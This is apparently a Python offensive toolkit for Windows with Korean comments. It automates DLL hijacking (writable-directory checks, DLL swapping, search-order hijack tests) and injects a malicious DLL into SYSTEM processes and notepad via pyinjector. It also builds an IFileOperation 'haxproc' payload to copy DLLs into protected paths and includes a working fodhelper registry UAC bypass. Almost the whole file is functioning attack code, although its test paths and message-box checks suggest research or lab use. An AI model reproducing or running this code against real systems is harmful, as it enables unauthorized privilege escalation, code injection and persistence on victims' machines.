import os
from tqdm import tqdm
from pyinjector import inject
import subprocess
import psutil
import shutil
from pywinauto import *
import time
import ctypes
import sys
import winreg
abspath = os.path.dirname(__file__)
class hiJacking():
    def hiJacking(self):
        pass
    #Listdlls.exe 파일을 이용하여 입력된 pid에서 로드하는 dll 목록을 가져옴
    def list_dll(self,pid):

        list_dll_path = os.getcwd() + "/" + "Listdlls.exe "
        stream = os.popen(list_dll_path + str(pid))
        
        dlls = stream.read()
        program_name = ""
        list_dlls = []
        list_programs = []
        path_lists = []

        try:
            split_text = dlls.replace("\\","/").replace('  ','\n').split('\n')
            
       
            for i in split_text:
                path_lists.append(i.replace(" ",""))
            
            for i in path_lists:
                if i.endswith(".exe"):
                    list_programs.append(i)
                if i.endswith(".dll"):
                    list_dlls.append(i)   
            for i in list_programs:
                if i.startswith("C:/"):
                    program_name = i
        except:
            print("Wrong pid...")
        return program_name, list_dlls
        
        #dll이 저장되어 있는 폴더의 일반 유저 또한 쓰기 권한이 있는지 검증
    def check_permission(self,path):
        user_perm_dir = []
        user_perm_file = []
        for i in path:
            dir_path = os.path.dirname(i)
            try:
                open(dir_path+"/test.txt","w")
                os.remove(dir_path+"/test.txt")
                name_split = i.split('/')
                name = name_split[-1]
                user_perm_file.append(name)
                user_perm_dir.append(i)
                # if os.access(dir_path,os.W_OK):
                #     name_split = i.split('/')
                #     name = name_split[-1]
                #     user_perm_file.append(name)
                #     user_perm_dir.append(i)
            except:
                pass
        return user_perm_file,user_perm_dir
    #strings 명령어를 이용하여 dll을 하드코딩으로 로드하는지 확인
    def find_string(self,name,list_name,list_dir):
        stream = os.popen("strings " + name)
        strings = stream.read()
        strings = strings.replace("\\",'/').split("\n")
        string_dll = []
        for i in strings:
            if i.endswith(".dll"):
                string_dll.append(i)
        for string in string_dll:
            if  string in list_name:
                return True
            elif string in list_dir:
                return True
            else:
                return False
    #exe파일을 직접 실행하여 pid를 가져옴
    def create_process(self,path):
            return subprocess.Popen([path]).pid
        
    #악성 dll을 입력받은 경로로 바꿔줌
    def change_dll(self,dll_path,hijactable_dll_path,program_name):
        successed_list = []
        try:
            tmp = os.environ['TMP']
            for i in hijactable_dll_path:
                
                original_name_list = i.split('/')
                original_name = original_name_list[-1]
                path = tmp.replace("\\","/") + "/" + original_name
                dir_path = os.path.dirname(i)
                shutil.move(i,tmp)
                shutil.copy2(dll_path,i)
                pid = dll_hijact.create_process(program_name)
                app = application.Application()
                app.connect(process=pid)
                
                try:
                    message = app.window(title_re="SECU") 
                    message.OKButton.click()
                    successed_list.append(i)
                    psutil.Process(pid).kill()
                except:
                    pass
                time.sleep(0.1)  # import time
                os.remove(i)
                shutil.move(path,dir_path)
        except Exception as e:
            print("Cannot remove or write DLL")
            print(e)
        return successed_list
    
    def search_order_hijack(self,pid):
        program_name, list_dlls = self.list_dll(pid)
        program_path = os.path.dirname(program_name)
        changed_path = []
        search_order_path = []
        for i in list_dlls:
            name_split = i.split('/')
            name = name_split[-1]
            search_order_path.append(program_path + "/" + name)
            
        for i in range(len(list_dlls)):
            try:
                shutil.copy2(list_dlls[i],search_order_path[i])
                changed_path.append(search_order_path[i])
            except:
                print(list_dlls[i] + "  1순위 복사 에러")
        newPid = self.create_process(program_name)
        program_name, newList_dlls = self.list_dll(newPid)

        successed_path = {}

        for i in newList_dlls:
            if i in changed_path:
                name_split = i.split('/')
                name = name_split[-1]
                
                for j in list_dlls:
                    name2_split = j.split('/')
                    name2 = name2_split[-1]
                    if name == name2:
                        successed_path[i] = j


        psutil.Process(newPid).kill()
        
            
        for i in changed_path:
                try:
                    os.remove(i)
                except:
                    print(i + " : cannot remove file")
        
        return successed_path
        
    # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
    # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
    def normal_hijack(self,path_dll,pid):
        successed_list = []
        program_name, list_dlls = self.list_dll(pid)
        file_list,dir_list = self.check_permission(list_dlls)
        if not len(dir_list) == 0:
            if self.find_string(program_name,file_list,dir_list):
                print("Detect programs vulnerable to dll injection")
                
                print("Vulnerable Program Name : " + program_name)
                psutil.Process(pid).kill()
                successed_list = self.change_dll(path_dll,dir_list,program_name)
                print("Vulnerable dll Lists : ")
                for i in successed_list:
                    print(i)
            else:
                print("Nah....")
        else:
            print("Not Found writable dir")
        return successed_list
    
    
    def abusing_IfileOperation(self,exe_path,dll_path="CreateDLL.dll"):
        # #3. 수정 완료한 dll.cpp를 Cmake를 이용하여 빌드(종속성 에러 때문에 Cmake 설치 요구 표시)
        if(os.system("cmake")):
            os.system("cmake.msi")
            print("Cmake 설치 후 다시 기능을 실행해 주세요")
            return  
        else:
            os.system("cls")
            #pass
        successed_list = []
        dll_abspath = ""
        if(dll_path == "CreateDLL.dll"):
            dll_abspath = os.path.dirname(__file__) + "\\" + dll_path
        else:
            dll_abspath = dll_path
        
        # # DLL 리스트 파싱 후 원활한 파일 이동을 위해 프로세스 종료
        exe_pid = self.create_process(exe_path)
        
        program_name, list_dlls = self.list_dll(exe_pid)
        
        psutil.Process(exe_pid).kill()
        dll_abspath = dll_abspath.replace("\\","\\\\")
        # 원본을 전부 dll_tmp 로 복사하기
        for i in list_dlls:
            if i.endswith("CreateDLL.dll"):
                
                shutil.copy2(i,abspath+"\\"+"dll_tmp")
                original_dll_path = os.path.dirname(i)
                dll_name = i.split("/")[-1]
                
            # #2. IFileOperation 코드에 원하는 인자를 세팅 후 빌드 하기
                
                original_dll_path = original_dll_path.replace("/","\\\\")
                dll_code = "int haxproc(){HRESULT test = CopyItem(L\"%s\", L\"%s\", L\"%s\");if (SUCCEEDED(test)){MessageBoxA(0, \"Stage-2 Installed\", 0, 0);}return 0;}"%(dll_abspath,original_dll_path,dll_name)
                
                with open("CreateIFileOperationDLL/reference.cpp",'r',encoding='utf-8') as refFile:
                    refText = refFile.readlines()
                    refFile.close()
                with open("CreateIFileOperationDLL/dll.cpp",'w',encoding='utf-8') as dllFile:
                    for i in refText:
                        dllFile.write(i)
                    dllFile.write(str(dll_code))
                    dllFile.close()
                
                # dll 빌드 하기
                os.system("cd "+ abspath + "/"+"CreateIFileOperationDLL && .\Build.bat")
                time.sleep(1)
                os.system("cls")
                # notePad에 인젝션 하기
                exploit_dll_path = abspath + "/"+"CreateIFileOperationDLL/Debug/exploitDll.dll"
                
                
                #notePad_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe") 
                
                uac = uac_bypass()
                #notePad_pid = uac.execute()
                notePad_pid = self.create_process("C:/Windows/System32/notepad.exe")
               
                
                try:

                    inject(notePad_pid,exploit_dll_path)
                    print("Attack Injection Success!")
                except Exception as e:
                    print("Attack Injection Fail...")
                time.sleep(1)
                app = Application(backend="win32").connect(process=notePad_pid)
                try:
                    dlg = app.window(title_re="오류")
                    dlg.확인.click()
                    pass
                except:
                    print("Injection Fail..")
                else:
                    # 6. 불필요한 프로세스 종료 후 하이제킹한 DLL 이 로드 될 수 있도록 실행
                    
                    psutil.Process(notePad_pid).kill()
                    
                    #다음을 위해 파일 정리하기   
                    os.remove(abspath + "/"+"CreateIFileOperationDLL\CMakeCache.txt")
                    shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\CMakeFiles")
                    shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\Debug")
                    os.remove(abspath + "/"+"CreateIFileOperationDLL\dll.cpp")
                
                    
                    
                    hijacked_pid = self.create_process(exe_path)
                    original_dll_path = original_dll_path.replace("\\\\","/").replace("\\","/")   
                    dll_tmp_path = abspath + "/" + "dll_tmp"+"/"+dll_name
                    # 7. 기본 악성 DLL을 사용시 messageBoxA가 띄워지므로 pywinauto를 이용하여 확인 버튼 클릭 정상 동작시 성공으로 간주
                    # 4. 원본 dll을 복사 hijacking 종료 후 다시 원상 복귀
                    os.system("cls")
                    app = Application(backend="win32").connect(process=hijacked_pid)
                    try:
                        dlg = app.window(title_re="SECU")
                        dlg.확인.click()
                        print("Hijacking Success!")
                        successed_list.append(original_dll_path + "/" + dll_name)
                    except:
                        print("Hijacking Fail..")
                    
                    psutil.Process(hijacked_pid).kill()
                    # shutil.copy2(dll_tmp_path,original_dll_path)
                    # os.remove(dll_tmp_path)
                    original_dll_path = original_dll_path.replace("/","\\\\")
                    dll_tmp_path = dll_tmp_path.replace("\\","/").replace("/","\\\\")
                    dll_code = "int haxproc(){HRESULT test = CopyItem(L\"%s\", L\"%s\", L\"%s\");if (SUCCEEDED(test)){MessageBoxA(0, \"Stage-2 Installed\", 0, 0);}return 0;}"%(dll_tmp_path,original_dll_path,dll_name)
                    with open("CreateIFileOperationDLL/reference.cpp",'r',encoding='utf-8') as refFile:
                        refText = refFile.readlines()
                        refFile.close()
                    with open("CreateIFileOperationDLL/dll.cpp",'w',encoding='utf-8') as dllFile:
                        for i in refText:
                            dllFile.write(i)
                        dllFile.write(str(dll_code))
                        dllFile.close()
                

                    os.system("cd " + abspath + "/"+ "CreateIFileOperationDLL && .\Build.bat")
                    time.sleep(1)
                    os.system("cls")
                    uac = uac_bypass()
                    #uac.execute()
                    notePad_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe") 
                    for proc in psutil.process_iter():
                        if proc.name().endswith("notepad.exe"):
                            notePad_pid = proc.pid
                
                    try:
                        inject(notePad_pid,exploit_dll_path)
                        print("Restore Injection Success!")
                    except:
                        print("Restore Injection Fail...")
                    time.sleep(1)
                    psutil.Process(notePad_pid).kill()
                    os.remove(abspath + "/"+"CreateIFileOperationDLL\CMakeCache.txt")
                    shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\CMakeFiles")
                    shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\Debug")
                    os.remove(abspath + "/"+"CreateIFileOperationDLL\dll.cpp")
                    
        return successed_list
class injection():
    #SYSTEM 권한으로 실행되는 프로세스 파싱, return 값 => pid
    def find_process(self):
        proc_lists = []
        try:
            # 실행중인 프로세스를 순차적으로 검색
            for proc in psutil.process_iter():
            # 프로세스 이름을 ps_name에 할당
                ps_name = proc.name()
                # 실행 명령어와 인자(argument)를 리스트 형식으로 가져와 cmdline에 할당
                cmdline = proc.cmdline()
                
                username = proc.username()
                if username.endswith('SYSTEM'):
                    proc_lists.append(proc.ppid())
                print('NAME:', ps_name, ' CMD:', cmdline, ' userName: ', username)
            return proc_lists
        except:
            pass
        
        
     
    #find_process에서 찾은 pid를 악성 dll을 이용하여 인젝션 해보기
    def attack(self,pid):
        path_dll = abspath + "/" + "CreateDLL.dll"
        inject(pid,path_dll)
        app = Application(backend="win32").connect(process=pid)
        try:
            dlg = app.window(title_re="SECU")
            dlg.확인.click()
                    
        except:
            print("Injection Fail..")
        
        else:
            print("Injection Success!")
            print("Target PID : " + pid)
        
        

class uac_bypass():

    def __init__(self):
        self.CMD                   = r"C:\Windows\System32\notepad.exe"
        self.REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
        self.DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
        self.FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
    def is_running_as_admin(self):
        '''
        Checks if the script is running with administrative privileges.
        Returns True if is running as admin, False otherwise.
        '''    
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
        
    def create_reg_key(self,key, value):
        '''
        Creates a reg key
        '''
        try:        
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REG_PATH)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.REG_PATH, 0, winreg.KEY_WRITE)                
            winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
            winreg.CloseKey(registry_key)
        except WindowsError:        
            raise

    def bypass_uac(self,cmd):
        '''
        Tries to bypass the UAC
        '''
        try:
            self.create_reg_key(self.DELEGATE_EXEC_REG_KEY, '')
            self.create_reg_key(None, cmd)    
        except WindowsError:
            raise

    def execute(self):        
        if not self.is_running_as_admin():
            try:                
                
                self.bypass_uac(self.CMD)                
                os.system(self.FOD_HELPER)
                for proc in psutil.process_iter():
                    if proc.name().endswith("notepad.exe"):
                        notePad_pid = proc.pid                              
            except WindowsError:
                return
        else:
            pass
    
        return notePad_pid
if __name__=='__main__': 
        dll_inject = injection()
        dll_hijact = hiJacking()
        path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
        # path_dll = "CreateIFileOperationDLL\Debug\PROJECT_NAME.dll"
        # pid = dll_hijact.create_process(path_exe)
        # inject(pid,path_dll)
        #dll_hijact.abusing_IfileOperation(1234)
        #pid = dll_hijact.create_process("C:/Users/CodeByO/Desktop/test/crackme1.exe")
        # success = dll_hijact.search_order_hijack(20588)    
        # for i,j in success.items():
        #     print(i,j)
        #os.system("cd CreateIFileOperationDLL && .\Build.bat")
        # time.sleep(2)
        # explore_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe")
        
        # inject(explore_pid,"CreateIFileOperationDLL/Debug/exploitDll.dll") 
        # time.sleep(1)
        # psutil.Process(explore_pid).kill()   
        # os.remove("CreateIFileOperationDLL\CMakeCache.txt")
        # shutil.rmtree("CreateIFileOperationDLL\CMakeFiles")
        successed_list = dll_hijact.abusing_IfileOperation(path_exe)
        for i in successed_list:
            print(i)